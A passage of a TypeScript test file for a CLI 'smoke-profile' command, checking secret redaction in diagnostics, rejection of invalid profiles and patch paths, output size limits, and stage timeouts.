    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-smoke-staging-authorization-'))
    try {
      const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
        profileRoot,
        prepare: async () => {
          throw new Error(`staging failed\nrequest Authorization: ${secret}\nvisible: keep-context`)
        },
      })

      expect(result.status).toBe(1)
      expect(result.stdout).toContain('request Authorization: [REDACTED]')
      expect(result.stdout).toContain('visible: keep-context')
      expect(result.stdout).not.toContain(secret)
      expect(result.stdout).not.toContain(leakedTail)
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it.each([
    ['dotted path', 'request.headers.Authorization:'],
    ['double-quoted bracket', 'request.headers["Authorization"]:'],
    ['single-quoted bracket', "request.headers['authorization'] ="],
    ['unquoted bracket', 'request[headers][AUTHORIZATION]:'],
  ])('redacts a complete multiword secret after a %s key', async (_name, key) => {
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-smoke-staging-qualified-secret-'))
    const secret = 'Basic second basic secret words'
    try {
      const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
        profileRoot,
        prepare: async () => {
          throw new Error(`staging failed\n${key} ${secret}\nvisible: keep-context`)
        },
      })

      const message = commandIssues(result)[0]?.message ?? ''
      expect(result.status).toBe(1)
      expect(message).toContain(`${key} [REDACTED]`)
      expect(message).toContain('visible: keep-context')
      expect(message).not.toContain(secret)
      expect(message).not.toContain('basic secret words')
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('preserves an unrelated dangling quote in an incomplete diagnostic', async () => {
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-smoke-staging-dangling-quote-'))
    try {
      const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
        profileRoot,
        prepare: async () => {
          throw new Error('staging failed: "unterminated diagnostic')
        },
      })

      expect(result.status).toBe(1)
      expect(result.stdout).toContain('unterminated diagnostic')
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('redacts complete multiline PEM blocks from staging diagnostics', async () => {
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-smoke-staging-pem-'))
    const privateKey = [
      '-----BEGIN PRIVATE KEY-----',
      'SUPERSECRETPAYLOAD123',
      '-----END PRIVATE KEY-----',
    ].join('\n')
    try {
      const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
        profileRoot,
        prepare: async () => { throw new Error(`staging failed:\n${privateKey}`) },
      })

      expect(result.status).toBe(1)
      expect(result.stdout).toContain('[REDACTED]')
      expect(result.stdout).not.toContain('BEGIN PRIVATE KEY')
      expect(result.stdout).not.toContain('SUPERSECRETPAYLOAD123')
      expect(result.stdout).not.toContain('END PRIVATE KEY')
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it.each([
    {
      name: 'malformed footer',
      privateKey: [
        '-----BEGIN PRIVATE KEY-----',
        'MALFORMEDPEMPAYLOAD123',
        '-----END PRIVATE KEY----',
        'retry disabled',
      ].join('\n'),
      secret: 'MALFORMEDPEMPAYLOAD123',
    },
    {
      name: 'unterminated block',
      privateKey: [
        '-----BEGIN EC PRIVATE KEY-----',
        'UNTERMINATEDPEMPAYLOAD123',
      ].join('\n'),
      secret: 'UNTERMINATEDPEMPAYLOAD123',
    },
    {
      name: 'mismatched footer',
      privateKey: [
        '-----BEGIN RSA PRIVATE KEY-----',
        'MISMATCHEDPEMPAYLOAD123',
        '-----END PRIVATE KEY-----',
        'retry disabled',
      ].join('\n'),
      secret: 'MISMATCHEDPEMPAYLOAD123',
    },
  ])('redacts a $name through its remaining payload while preserving diagnostics', async ({ privateKey, secret }) => {
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-smoke-staging-malformed-pem-'))
    try {
      const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
        profileRoot,
        prepare: async () => {
          throw new Error(`staging failed: certificate parse failed\n${privateKey}`)
        },
      })
      const payload = JSON.parse(result.stdout) as {
        issues: Array<{ message: string }>
        stages: Array<{ error?: string }>
      }

      expect(result.status).toBe(1)
      expect(payload.issues[0]?.message).toContain('staging failed: certificate parse failed')
      expect(payload.stages[0]?.error).toContain('staging failed: certificate parse failed')
      expect(result.stdout).toContain('[REDACTED]')
      expect(result.stdout).not.toContain('BEGIN')
      expect(result.stdout).not.toContain(secret)
      if (privateKey.includes('retry disabled')) expect(result.stdout).toContain('retry disabled')
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('fails closed for installed candidate artifact inconsistencies', async () => {
    const cases = [
      {
        name: 'package name does not match the catalog',
        manifest: { name: 'other-package' },
        code: 'artifact-package-name-mismatch',
      },
      {
        name: 'bundle patch does not match the catalog',
        manifest: { dsh: { bundle: { patch: './other.patch.yml' } } },
        code: 'artifact-bundle-patch-missing',
      },
      {
        name: 'package main entry is missing',
        manifest: { main: undefined },
        code: 'artifact-main-missing',
      },
      {
        name: 'package main entry is not built',
        manifest: { main: './missing.mjs' },
        code: 'artifact-main-missing',
      },
    ] as const
    for (const testCase of cases) {
      const home = mkdtempSync(join(tmpdir(), 'dsh-curated-smoke-invalid-'))
      const profileRoot = join(home, 'profiles', 'web-curated')
      const candidate = {
        ...admittedCandidate('dsh-web-search-pro'),
        runtimeDependencyClosureSha256: emptyRuntimeDependencyClosureSha,
      }
      mkdirSync(profileRoot, { recursive: true })
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        dsh: { profile: { bundles: ['dsh-web-search-pro'] } },
      }))
      stageCandidatePackage(
        profileRoot,
        'dsh-web-search-pro',
        undefined,
        'manifest' in testCase ? testCase.manifest : {},
        undefined,
        candidate,
      )
      try {
        const commands = await commandsWithCatalogCandidates([candidate])
        const result = await commands.runSmokeProfile(['--profile', 'web-curated', '--json'], {
          profiles: { 'web-curated': { bundles: ['dsh-web-search-pro'] } },
          profileRoot,
          artifactRoots: [profileRoot],
          runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 1 }),
        })

        expect(result.status, testCase.name).toBe(1)
        expect(commandIssues(result), testCase.name)
          .toContainEqual(expect.objectContaining({ code: testCase.code }))
        expect(result.stdout).not.toContain('sk-module-load-secret')
      } finally {
        rmSync(home, { recursive: true, force: true })
      }
    }
  })

  it('rejects missing installed patches, bundle mismatches, and unresolved candidates', async () => {
    const home = mkdtempSync(join(tmpdir(), 'dsh-curated-smoke-resolution-'))
    const profileRoot = join(home, 'profiles', 'web-curated')
    mkdirSync(profileRoot, { recursive: true })
    writeFileSync(join(profileRoot, '.npmrc'), 'ignore-scripts=true\n')
    try {
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        name: 'dsh-profile-web-curated',
        dsh: { profile: { bundles: ['other-bundle'] } },
      }))
      let result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
        profiles: { 'web-curated': { bundles: ['dsh-web-search-pro'] } },
        profileRoot,
        runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 1 }),
      })
      expect(result.stdout).toContain('bundle list does not match')

      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        name: 'dsh-profile-web-curated',
        dsh: { profile: { bundles: ['dsh-web-search-pro'] } },
      }))
      result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
        profiles: { 'web-curated': { bundles: ['dsh-web-search-pro'] } },
        profileRoot,
        runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 1 }),
      })
      expect(result.stdout).toContain('must be active for profile web-curated')

      const candidate = {
        ...admittedCandidate('dsh-web-search-pro'),
        runtimeDependencyClosureSha256: emptyRuntimeDependencyClosureSha,
      }
      const packageDir = stageCandidatePackage(
        profileRoot,
        'dsh-web-search-pro',
        undefined,
        {},
        undefined,
        candidate,
      )
      unlinkSync(join(packageDir, 'cordis.patch.yml'))
      const commands = await commandsWithCatalogCandidates([candidate])
      result = await commands.runSmokeProfile(['--profile', 'web-curated', '--json'], {
        profiles: { 'web-curated': { bundles: ['dsh-web-search-pro'] } },
        profileRoot,
        artifactRoots: [profileRoot],
        runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 1 }),
      })
      expect(result.stdout).toContain('bundle patch is missing')
    } finally {
      rmSync(home, { recursive: true, force: true })
    }
  })

  it('rejects invalid installed candidate metadata before artifact loading', async () => {
    const baseCandidate = admittedCandidate('dsh-web-search-pro')
    vi.resetModules()
    vi.doMock('@deepseek-ai/dsh-curated-policy', async () => {
      const actual = await vi.importActual<typeof import('@deepseek-ai/dsh-curated-policy')>(
        '@deepseek-ai/dsh-curated-policy',
      )
      const catalog = actual.loadCuratedCatalog()
      const candidate = baseCandidate
      return {
        ...actual,
        loadCuratedCatalog: () => ({
          ...catalog,
          candidates: [
            { ...candidate, id: 'inactive', expectedPackage: 'inactive', active: false },
            { ...candidate, id: 'wrong-profile', expectedPackage: 'wrong-profile', targetProfiles: [] },
            { ...candidate, id: 'missing-manifest', expectedPackage: 'missing-manifest', manifestPath: null },
            { ...candidate, id: 'missing-patch', expectedPackage: 'missing-patch', bundlePatch: null },
            { ...candidate, id: 'unsafe-patch', expectedPackage: 'unsafe-patch', bundlePatch: '../patch.yml' },
          ],
        }),
      }
    })
    const commands = await import('../src/index.ts')
    const home = mkdtempSync(join(tmpdir(), 'dsh-curated-smoke-metadata-'))
    const profileRoot = join(home, 'profiles', 'web-curated')
    mkdirSync(profileRoot, { recursive: true })
    writeFileSync(join(profileRoot, '.npmrc'), 'ignore-scripts=true\n')
    try {
      const cases = [
        ['inactive', 'must be active for profile'],
        ['wrong-profile', 'must be active for profile'],
        ['missing-manifest', 'must declare package manifest and bundle patch metadata'],
        ['missing-patch', 'must declare package manifest and bundle patch metadata'],
        ['unsafe-patch', 'must declare a safe relative bundle patch path'],
      ] as const
      for (const [packageName, message] of cases) {
        writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
          name: 'dsh-profile-web-curated',
          dsh: { profile: { bundles: [packageName] } },
        }))
        const result = await commands.runSmokeProfile(['--profile', 'web-curated', '--json'], {
          profiles: { 'web-curated': { bundles: [packageName] } },
          profileRoot,
          runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 1 }),
        })

        expect(result.status, packageName).toBe(1)
        expect(result.stdout, packageName).toContain(message)
      }
    } finally {
      rmSync(home, { recursive: true, force: true })
    }
  })

  it('uses the installed runner and contains profile loading failures', async () => {
    const home = mkdtempSync(join(tmpdir(), 'dsh-curated-installed-runner-'))
    const profileRoot = join(home, 'profiles', 'web-curated')
    mkdirSync(profileRoot, { recursive: true })
    writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
      dsh: { profile: { bundles: ['fixture-local-bundle'] } },
    }))
    stageCandidatePackage(profileRoot, 'fixture-local-bundle')
    writeFileSync(join(profileRoot, 'cordis.patch.yml'), 'invalid: patch\n')
    try {
      const result = await runSmokeProfile([`--profile-root=${profileRoot}`, '--profile', 'web-curated', '--json'], {
        profiles: { 'web-curated': { bundles: ['fixture-local-bundle'] } },
      })

      expect(result.status).toBe(1)
      const payload = JSON.parse(result.stdout) as SmokeProfileReport
      expect(payload.issues).toContainEqual({
        code: 'smoke-profile-stage-failed',
        target: 'dump-config',
        message: 'stage dump-config exited with status 1',
      })
    } finally {
      rmSync(home, { recursive: true, force: true })
    }
  })

  it('emits staged JSON for a valid profile without starting a server', async () => {
    const observed: string[] = []
    const runner: SmokeProfileRunner = async (request: SmokeProfileRunnerRequest) => {
      expect(Number.isInteger(request.timeoutMs)).toBe(true)
      expect(request.timeoutMs).toBeGreaterThan(0)
      expect(request.timeoutMs).toBeLessThanOrEqual(55_000)
      observed.push(`${request.stage}:${request.profile}`)
      return { status: 0, stdout: `${request.stage} ok`, stderr: '', durationMs: 7 }
    }

    const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], { runner })

    expect(result.status).toBe(0)
    const payload = JSON.parse(result.stdout) as SmokeProfileReport
    expect(payload).toEqual({
      command: 'smoke-profile',
      ok: true,
      observed: false,
      profile: 'web-curated',
      timeLimitMs: 55000,
      stages: [
        { name: 'staging', ok: true, durationMs: payload.stages[0]?.durationMs },
        { name: 'manifest', ok: true, durationMs: payload.stages[1]?.durationMs },
        { name: 'bundle-parse', ok: true, durationMs: payload.stages[2]?.durationMs },
        { name: 'dump-config', ok: true, durationMs: 7, status: 0 },
        { name: 'help', ok: true, durationMs: 7, status: 0 },
      ],
      issues: [],
    })
    expect(payload.stages[0]?.durationMs).toBeGreaterThanOrEqual(0)
    expect(payload.stages[1]?.durationMs).toBeGreaterThanOrEqual(0)
    expect(payload.stages[2]?.durationMs).toBeGreaterThanOrEqual(0)
    expect(observed).toEqual([
      'dump-config:web-curated',
      'help:web-curated',
    ])
  })

  it('smokes the shipped web and headless profiles through the same staged checks', async () => {
    const observed: string[] = []
    const runner: SmokeProfileRunner = async (request: SmokeProfileRunnerRequest) => {
      observed.push(`${request.stage}:${request.profile}:${request.bundles?.join(',')}`)
      return { status: 0, stdout: `${request.stage} ok`, stderr: '', durationMs: 5 }
    }

    const web = await runSmokeProfile(['--profile', 'web', '--json'], { runner })
    const headless = await runSmokeProfile(['--profile', 'headless', '--json'], { runner })

    expect(web.status).toBe(0)
    expect(headless.status).toBe(0)
    expect(JSON.parse(web.stdout)).toMatchObject({
      command: 'smoke-profile',
      ok: true,
      profile: 'web',
    })
    expect(JSON.parse(headless.stdout)).toMatchObject({
      command: 'smoke-profile',
      ok: true,
      profile: 'headless',
    })
    expect(observed).toEqual([
      'dump-config:web:@deepseek-ai/dsh-base,@deepseek-ai/dsh-web-app',
      'help:web:@deepseek-ai/dsh-base,@deepseek-ai/dsh-web-app',
      'dump-config:headless:@deepseek-ai/dsh-base,@deepseek-ai/dsh-headless',
      'help:headless:@deepseek-ai/dsh-base,@deepseek-ai/dsh-headless',
    ])
  })

  it('renders text success when injected child checks pass', async () => {
    const result = await runSmokeProfile(['--profile', 'web-curated'], {
      runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 1 }),
    })

    expect(result.status).toBe(0)
    expect(result.stderr).toBe('')
    expect(result.stdout).toMatch(/^smoke-profile: ok \(profile web-curated\)\n/)
    expect(result.stdout).toMatch(/staging: ok \([0-9.]+ ms\)\n/u)
    expect(result.stdout).toMatch(/manifest: ok \([0-9.]+ ms\)\n/u)
    expect(result.stdout).toMatch(/bundle-parse: ok \([0-9.]+ ms\)\n/u)
    expect(result.stdout).toContain('dump-config: ok (1 ms, status 0)\n')
    expect(result.stdout).toContain('help: ok (1 ms, status 0)\n')
  })

  it('rejects a profile template with no bundles', async () => {
    const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
      profiles: { 'web-curated': { bundles: [] } },
      runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 1 }),
    })

    expect(result.status).toBe(1)
    expect(JSON.parse(result.stdout)).toMatchObject({
      command: 'smoke-profile',
      ok: false,
      profile: 'web-curated',
      issues: [{ code: 'smoke-profile-bundle-missing', target: 'web-curated' }],
    })
  })

  it('measures successful and failed synchronous stages with a monotonic clock', async () => {
    const successfulTimes = [100, 110, 113, 120, 127, 130, 140, 150, 160, 170, 180]
    const success = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
      now: () => successfulTimes.shift() as number,
      runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 1 }),
    })
    const failedTimes = [200, 205, 209, 211, 219, 220, 228]
    const failure = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
      profiles: { 'web-curated': { bundles: [] } },
      now: () => failedTimes.shift() as number,
      runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 1 }),
    })

    const successPayload = JSON.parse(success.stdout) as SmokeProfileReport
    expect(successPayload.stages.slice(0, 3)).toEqual([
      { name: 'staging', ok: true, durationMs: 3 },
      { name: 'manifest', ok: true, durationMs: 7 },
      { name: 'bundle-parse', ok: true, durationMs: 10 },
    ])
    expect(JSON.parse(failure.stdout)).toMatchObject({
      stages: [
        { name: 'staging', ok: true, durationMs: 4 },
        { name: 'manifest', ok: true, durationMs: 8 },
        { name: 'bundle-parse', ok: false, durationMs: 8 },
      ],
    })
  })

  it('measures a failed manifest stage with a monotonic clock', async () => {
    const times = [300, 305, 312, 315, 322]
    const result = await runSmokeProfile(['--profile', '../invalid', '--json'], {
      now: () => times.shift() as number,
      runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 1 }),
    })

    expect(JSON.parse(result.stdout)).toMatchObject({
      stages: [
        { name: 'staging', ok: true, durationMs: 7 },
        {
          name: 'manifest',
          ok: false,
          durationMs: 7,
          error: 'profile must name a known shipped or curated profile without path separators',
        },
      ],
    })
  })

  it('rejects a profile template whose bundle list is not an array', async () => {
    const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
      profiles: { 'web-curated': {} },
      runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 1 }),
    })

    expect(result.status).toBe(1)
    expect(JSON.parse(result.stdout)).toMatchObject({
      command: 'smoke-profile',
      ok: false,
      issues: [{ code: 'smoke-profile-bundle-missing' }],
    })
  })

  it('rejects empty bundle names in text mode', async () => {
    const result = await runSmokeProfile(['--profile', 'web-curated'], {
      profiles: { 'web-curated': { bundles: [''] } },
      runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 1 }),
    })

    expect(result.status).toBe(1)
    expect(result.stdout).toContain('smoke-profile: failed (profile web-curated, 1 issues)')
    expect(result.stdout).toContain('smoke-profile-bundle-invalid web-curated')
  })

  it('rejects session-export all bundles', async () => {
    const result = await runSmokeProfile(['--profile', 'web-enterprise', '--json'], {
      profiles: { 'web-enterprise': { bundles: ['@deepseek-ai/dsh-curated-base', 'dsh-suite', 'dsh-mcp-manager'] } },
      runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 1 }),
    })

    expect(result.status).toBe(1)
    expect(JSON.parse(result.stdout)).toMatchObject({
      command: 'smoke-profile',
      ok: false,
      issues: [{ code: 'smoke-profile-session-export-all-bundle', target: 'web-enterprise' }],
    })
  })

  it('accepts a lone explicit MCP fallback bundle', async () => {
    const result = await runSmokeProfile(['--profile', 'web-enterprise', '--json'], {
      profiles: { 'web-enterprise': { bundles: ['@deepseek-ai/dsh-curated-base', 'dsh-mcp-manager'] } },
      runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 1 }),
    })

    expect(result.status).toBe(0)
    expect(JSON.parse(result.stdout)).toMatchObject({
      command: 'smoke-profile',
      ok: true,
      issues: [],
    })
  })

  it('runs child checks when a profile omits the curated-base bundle', async () => {
    const observed: string[] = []
    const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
      profiles: { 'web-curated': { bundles: ['plugin-a'] } },
      runner: async (request: SmokeProfileRunnerRequest) => {
        observed.push(request.stage)
        return { status: 0, stdout: '', stderr: '', durationMs: 2 }
      },
    })

    expect(result.status).toBe(0)
    expect(observed).toEqual(['dump-config', 'help'])
  })

  it('rejects an unknown or invalid profile before running child checks', async () => {
    let calls = 0
    const result = await runSmokeProfile(['--profile', '../bad', '--json'], {
      runner: async () => {
        calls += 1
        return { status: 0, stdout: '', stderr: '', durationMs: 1 }
      },
    })

    expect(result.status).toBe(1)
    expect(JSON.parse(result.stdout)).toMatchObject({
      command: 'smoke-profile',
      ok: false,
      issues: [{ code: 'smoke-profile-profile-invalid' }],
    })
    expect(calls).toBe(0)
  })

  it('records non-zero child process results as stage failures', async () => {
    const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
      runner: async (request: SmokeProfileRunnerRequest) => request.stage === 'dump-config'
        ? { status: 2, stdout: '', stderr: 'dump failed', durationMs: 4 }
        : { status: 0, stdout: '', stderr: '', durationMs: 4 },
    })

    const payload = JSON.parse(result.stdout) as SmokeProfileReport
    expect(result.status).toBe(1)
    expect(payload.stages).toContainEqual({
      name: 'dump-config',
      ok: false,
      durationMs: 4,
      status: 2,
      error: 'dump failed',
    })
    expect(payload.issues).toContainEqual({
      code: 'smoke-profile-stage-failed',
      target: 'dump-config',
      message: 'stage dump-config exited with status 2',
    })
  })

  it('allows an exact-limit smoke report and replaces the first byte beyond it', async () => {
    const limit = 1024 * 1024
    const run = async (error: string): Promise<CommandResult> =>
      runSmokeProfile(['--profile', 'web-curated', '--json'], {
        now: () => 0,
        runner: async (request: SmokeProfileRunnerRequest) => request.stage === 'dump-config'
          ? { status: 2, stdout: '', stderr: error, durationMs: 1 }
          : { status: 0, stdout: '', stderr: '', durationMs: 1 },
      })
    const oneByte = await run('x')
    const fixedBytes = Buffer.byteLength(oneByte.stdout) - 1
    const exact = await run('x'.repeat(limit - fixedBytes))

    expect(Buffer.byteLength(exact.stdout)).toBe(limit)
    expect(JSON.parse(exact.stdout)).not.toHaveProperty(
      'issues.0.code',
      'smoke-profile-output-limit',
    )

    const overflow = await run('x'.repeat(limit - fixedBytes + 1))
    expect(Buffer.byteLength(overflow.stdout)).toBeLessThanOrEqual(limit)
    expect(JSON.parse(overflow.stdout)).toMatchObject({
      command: 'smoke-profile',
      ok: false,
      issues: [{
        code: 'smoke-profile-output-limit',
        message: 'smoke-profile report exceeded 1048576-byte output limit',
      }],
    })
  })

  it('bounds JSON and text reports after NUL escaping and multibyte encoding', async () => {
    const diagnostic = '\0界'.repeat(300_000)
    for (const args of [
      ['--profile', 'web-curated', '--json'],
      ['--profile', 'web-curated'],
    ] as const) {
      const result = await runSmokeProfile(args, {
        now: () => 0,
        prepare: async () => { throw new Error(diagnostic) },
        runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 1 }),
      })

      expect(Buffer.byteLength(result.stdout)).toBeLessThanOrEqual(1024 * 1024)
      expect(result.stdout).toContain('smoke-profile-output-limit')
      expect(result.stdout).not.toContain('\\u0000')
      expect(result.stdout).not.toContain('界')
    }
  })

  it('replaces two failed stages whose complete serialized report exceeds the limit', async () => {
    const secret = 'smoke-report-secret'
    const calls: string[] = []
    const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
      now: () => 0,
      runner: async (request: SmokeProfileRunnerRequest) => {
        calls.push(request.stage)
        return {
          status: 2,
          stdout: '',
          stderr: `token=${secret}\n${request.stage}:${'x'.repeat(600 * 1024)}`,
          durationMs: 1,
        }
      },
    })

    expect(calls).toEqual(['dump-config', 'help'])
    expect(Buffer.byteLength(result.stdout)).toBeLessThanOrEqual(1024 * 1024)
    expect(JSON.parse(result.stdout)).toMatchObject({
      command: 'smoke-profile',
      ok: false,
      issues: [{ code: 'smoke-profile-output-limit' }],
    })
    expect(result.stdout).not.toContain(secret)
    expect(result.stderr).not.toContain(secret)
  })

  it('enforces the 55 second command limit and reports timeout by stage', async () => {
    let helpTimeout = 0
    const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
      runner: async (request: SmokeProfileRunnerRequest) => {
        expect(Number.isInteger(request.timeoutMs)).toBe(true)
        if (request.stage === 'help') helpTimeout = request.timeoutMs
        return request.stage === 'help'
          ? { status: 124, stdout: '', stderr: '', durationMs: request.timeoutMs, timedOut: true }
          : { status: 0, stdout: '', stderr: '', durationMs: 3 }
      },
    })

    const payload = JSON.parse(result.stdout) as SmokeProfileReport
    expect(result.status).toBe(1)
    expect(payload.stages).toContainEqual({
      name: 'help',
      ok: false,
      durationMs: helpTimeout,
      status: 124,
      error: `stage timed out after ${String(helpTimeout)} ms`,
    })
    expect(payload.issues).toContainEqual({
      code: 'smoke-profile-stage-timeout',
      target: 'help',
      message: `stage timed out after ${String(helpTimeout)} ms`,
    })
  })

  it('does not trust runner-reported duration for the aggregate deadline', async () => {
    const observed: string[] = []
    const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
      prepare: async () => undefined,
      runner: async (request: SmokeProfileRunnerRequest) => {
        observed.push(request.stage)
        return { status: 0, stdout: '', stderr: '', durationMs: request.timeoutMs }
      },
    })

    const payload = JSON.parse(result.stdout) as SmokeProfileReport
    expect(result.status).toBe(0)
    expect(observed).toEqual(['dump-config', 'help'])
    expect(payload.issues).toEqual([])
  })

  it('uses elapsed wall time instead of summed runner durations', async () => {
    const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
      runner: async (request: SmokeProfileRunnerRequest) => request.stage === 'dump-config'
        ? { status: 0, stdout: '', stderr: '', durationMs: 54999 }
        : { status: 0, stdout: '', stderr: '', durationMs: 2 },
    })

    const payload = JSON.parse(result.stdout) as SmokeProfileReport
    expect(result.status).toBe(0)
    expect(payload.issues).toEqual([])
  })

  it('uses monotonic elapsed time when a runner understates its duration', async () => {
    const observed: string[] = []
    const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
      timeLimitMs: 10,
      runner: async (request: SmokeProfileRunnerRequest) => {
        observed.push(request.stage)
        await new Promise(resolve => setTimeout(resolve, 25))
        return { status: 0, stdout: '', stderr: '', durationMs: 1 }
      },
    })
    const payload = JSON.parse(result.stdout) as SmokeProfileReport

    expect(result.status).toBe(1)
    expect(observed).toEqual(['dump-config'])
    expect(payload.issues).toContainEqual({
      code: 'smoke-profile-command-timeout',
      target: 'dump-config',
      message: 'smoke-profile budget exhausted after dump-config',
    })
  })

  it.skipIf(process.platform === 'win32')(
    'awaits owned runner cleanup after the public smoke deadline',
    async () => {
      const root = mkdtempSync(join(tmpdir(), 'dsh-curated-public-smoke-timeout-'))
      const pidFile = join(root, 'child.pid')
      const cwdFile = join(root, 'child.cwd')
      const script = join(root, 'child.mjs')
      let childPid: number | undefined
      writeFileSync(script, [
        'import { writeFileSync } from "node:fs"',
        'process.on("SIGTERM", () => {})',
        'writeFileSync(process.argv[2], String(process.pid))',
        'writeFileSync(process.argv[3], process.cwd())',
        'setInterval(() => {}, 1000)',
        '',
      ].join('\n'))
      try {
        const startedAt = Date.now()
        const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
          timeLimitMs: 100,
          runner: createSmokeProfileChildRunner(process.execPath, [script, pidFile, cwdFile]),
        })
        const elapsedMs = Date.now() - startedAt
        childPid = Number(readFileSync(pidFile, 'utf8'))
        const childCwd = readFileSync(cwdFile, 'utf8')

        expect(result.status).toBe(1)
        expect(elapsedMs).toBeGreaterThanOrEqual(250)
        expect(() => process.kill(childPid as number, 0)).toThrow()
        expect(existsSync(childCwd)).toBe(false)
      } finally {
        if (childPid !== undefined) {
          try {
            process.kill(childPid, 'SIGKILL')
          } catch {
            // The runner already reaped the child.
          }
        }
        rmSync(root, { recursive: true, force: true })
      }
    },
  )

  it('includes staging in the monotonic command deadline', async () => {
    const observed: string[] = []
    const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
      timeLimitMs: 10,
      prepare: async () => {
        await new Promise(resolve => setTimeout(resolve, 25))
      },
      runner: async (request: SmokeProfileRunnerRequest) => {
        observed.push(request.stage)
        return { status: 0, stdout: '', stderr: '', durationMs: 1 }
      },
    })
    const payload = JSON.parse(result.stdout) as SmokeProfileReport

    expect(result.status).toBe(1)
    expect(observed).toEqual([])
    expect(payload).toMatchObject({
      command: 'smoke-profile',
      ok: false,
      observed: false,
      profile: 'web-curated',
      stages: [{
        name: 'staging',
        ok: false,
        error: 'smoke-profile budget exhausted during staging',
      }],
      issues: [{
        code: 'smoke-profile-command-timeout',
        target: 'staging',
        message: 'smoke-profile budget exhausted during staging',
      }],
    })
  })

  it.each([
    ['success', '{ ok: true }', 0, true],
    ['failure', '{ ok: false, error: "delayed staging failure" }', 1, false],
  ] as const)('records an 80 ms staging worker delay on %s', async (_name, workerResult, status, ok) => {
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-delayed-staging-stage-'))
    const workerPath = join(profileRoot, 'delayed-worker.mjs')
    writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
      name: 'dsh-profile-web-curated',
      dsh: { profile: { bundles: ['fixture-bundle'] } },
    }))
    writeFileSync(workerPath, [
      'import { parentPort } from "node:worker_threads"',
      `setTimeout(() => parentPort.postMessage(${workerResult}), 80)`,
      '',
    ].join('\n'))
    try {
      const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
        profiles: { 'web-curated': { bundles: ['fixture-bundle'] } },
        profileRoot,
        stagingWorkerEntry: workerPath,
        runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 1 }),
      })
      const payload = JSON.parse(result.stdout) as SmokeProfileReport
      const staging = payload.stages.find(stage => stage.name === 'staging')

      expect(result.status).toBe(status)
      expect(staging).toMatchObject({ name: 'staging', ok })
      expect(staging?.durationMs).toBeGreaterThanOrEqual(70)
      if (!ok) expect(staging?.error).toBe('delayed staging failure')
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('swallows staging preparation rejections after the budget is exhausted', async () => {
    const result = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
      timeLimitMs: 0,
      prepare: async () => {
        throw new Error('sk-late-staging-secret')
      },
      runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 0 }),
    })
    await Promise.resolve()

    expect(result.status).toBe(1)
    expect(JSON.parse(result.stdout)).toMatchObject({
      observed: false,
      issues: [{ message: 'smoke-profile budget exhausted during staging' }],
    })
    expect(result.stdout).not.toContain('sk-late-staging-secret')
  })

  it('fails before or immediately after child stages when the wall deadline expires', async () => {
    const beforeTimes = [0, 0, 0, 0, 0, 0, 0, 2]
    const beforeResult = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
      timeLimitMs: 1,
      now: () => beforeTimes.shift() as number,
      runner: async () => ({ status: 0, stdout: '', stderr: '', durationMs: 0 }),
    })
    expect(JSON.parse(beforeResult.stdout)).toMatchObject({
      issues: [{ message: 'smoke-profile budget exhausted before dump-config' }],
    })

    const afterTimes = [0, 0, 0, 0, 0, 0, 0, 0, 2]
    const afterResult = await runSmokeProfile(['--profile', 'web-curated', '--json'], {
      timeLimitMs: 1,
      now: () => afterTimes.shift() as number,
